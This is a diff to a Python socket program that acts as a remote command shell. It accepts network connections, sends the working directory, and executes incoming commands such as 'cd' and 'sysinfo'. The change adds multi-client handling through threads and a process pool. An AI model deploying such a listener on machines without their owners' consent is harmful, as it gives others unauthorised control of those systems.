@@ -9,6 +9,8 @@ import platform
 from datetime import datetime
 import cpuinfo
 import socket
+import threading
+from multiprocessing import Pool
 
 #create a socket
 def create_socket():
@@ -33,20 +35,37 @@ def bind_socket():
         global s
         print("Binding the port: " + str(port))
         s.bind((host,port))
-        s.listen(3) #listen for 3 connections at once (max)
+        s.listen(5) #listen for 5 connections at once (max)
 
     except socket.error as error_messsage:
         print("Error binding the port: " + str(error_messsage) + "\n" + "Retrying...")
         bind_socket() #call the function again to try binding again
 
+
+
 #accept a connection with a server when socket is listening
 def accept_connection():
-    connection, address = s.accept()
-    print("Connection has been established! | " + "IP " + address[0] + " | Port " + str(address[1]))
-    currentWD = os.getcwd() + "> "
-    connection.send(str.encode( currentWD))
-    #do something with the connection
-    check_commands(connection)
+    while (1):
+        connection, address = s.accept()
+        print("Connection has been established! | " + "IP " + address[0] + " | Port " + str(address[1]))
+        currentWD = os.getcwd() + "> "
+        connection.send(str.encode( currentWD)) # send cwd
+        create_thread_for_process(connection)
+
+#creating thread of each client
+def create_thread_for_process(connection):
+        #each thread will start a new process for each client(i.e for each client 1 process and 1 thread)
+        thread = threading.Thread(target=create_process_for_client,args=([connection]))
+        thread.daemon = True
+        thread.start()
+#
+def create_process_for_client(connection):
+    #every new connection will start a new thread which will start a new process
+    #new process cause change directory requires new process not new thread for each client
+    pool = Pool(maxtasksperchild=2)
+    pool.map(check_commands, [connection])
+    pool.close()
+    pool.join()        
     
 #execute commands sent by the server
 def check_commands(connection):
@@ -60,7 +79,8 @@ def check_commands(connection):
         elif "sysinfo" in ''.join(data[:9]).lower():
             send_syteminfo_from_server(data,connection)
         elif "exit" in ''.join(data[:5]).lower():
-            print("Closing connection...")
+            print("Closing connection ...")
+            #print("Closed")
             connection.close()
             sys.exit()
             break
@@ -186,7 +206,7 @@ def send_syteminfo_from_server(command,connection):
 def execute_command(command,connection):
     if command.lower()=="close":
         connection.close()
-        
+    
     if command[:2] == 'cd':
             os.chdir(os.path.abspath(command[3:]))
             output_str = "Command Exectuted Successfully." + '\n'
